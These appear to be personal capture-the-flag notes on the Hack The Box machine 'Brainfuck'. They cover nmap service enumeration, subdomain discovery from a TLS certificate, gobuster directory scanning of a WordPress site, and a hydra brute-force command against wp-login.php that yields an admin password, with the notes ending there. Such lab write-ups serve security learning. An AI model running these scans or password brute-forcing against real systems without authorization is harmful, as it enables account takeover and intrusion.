###############
Brainfuck
INSANE Level
###############

1-Enummeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.228.97 -v
        PORT    STATE SERVICE  VERSION
        22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)

        25/tcp  open  smtp?
        |_smtp-commands: Couldn't establish connection on port 25

        110/tcp open  pop3     Dovecot pop3d
        |_pop3-capabilities: RESP-CODES SASL(PLAIN) PIPELINING UIDL TOP AUTH-RESP-CODE USER CAPA

        143/tcp open  imap     Dovecot imapd
        |_imap-capabilities: OK more LITERAL+ capabilities have LOGIN-REFERRALS IDLE AUTH=PLAINA0001 post-login SASL-IR listed Pre-login ID IMAP4rev1 ENABLE

        443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
        |_http-title: Welcome to nginx!
        |_ssl-date: TLS randomness does not represent time
        | tls-alpn: 
        |_  http/1.1
        | http-methods: 
        |_  Supported Methods: GET HEAD
        |_http-server-header: nginx/1.10.0 (Ubuntu)
        | tls-nextprotoneg: 
        |_  http/1.1
        | ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
        | Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
        | Issuer: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
        | Public Key type: rsa
        | Public Key bits: 3072
        | Signature Algorithm: sha256WithRSAEncryption
            | Not valid before: 2017-04-13T11:19:29
            | Not valid after:  2027-04-11T11:19:29
            | MD5:   cbf1:6899:96aa:f7a0:0565:0fc0:9491:7f20
            |_SHA-1: f448:e798:a817:5580:879c:8fb8:ef0e:2d3d:c656:cb66
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel



    # Port 443:
        We check the Certificate
            Email Address   orestis@brainfuck.htb
            DNS:www.brainfuck.htb
            DNS:sup3rs3cr3t.brainfuck.htb

        We add this domains to our /etc/hosts

        https://sup3rs3cr3t.brainfuck.htb/

        https://sup3rs3cr3t.brainfuck.htb/d/1-development:
            POST https://sup3rs3cr3t.brainfuck.htb/login
                    {
                    "errors": [
                        {
                        "status": "401",
                        "code": "permission_denied"
                        }
                    ]
                    }
            /.htaccess   

        https://brainfuck.htb/
            nginx 1.10.0
            WordPress 4.7.3
            └─$ gobuster dir -u https://brainfuck.htb/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -k     
                /wp-content           (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-content/]
                /wp-includes          (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-includes/]
                /wp-admin             (Status: 301) [Size: 194] [--> https://brainfuck.htb/wp-admin/]




        https://brainfuck.htb/wp-login.php
            Brute Forcing the login page

            └─$ hydra -l admin -P /home/kali/Desktop/Transfer_to_Victim_Machine/1000Million_Passwd/rockyou.txt brainfuck.htb https-post-form "/wp-login.php/login:username=^USER^&password=^PASS^&loginform=Login&lang=en_US:The password you entered for the username admin is incorrect." -V -f -o hydra-output.txt -t 4 -s 443 -I 

            443][http-post-form] host: brainfuck.htb   login: admin   password: laila123
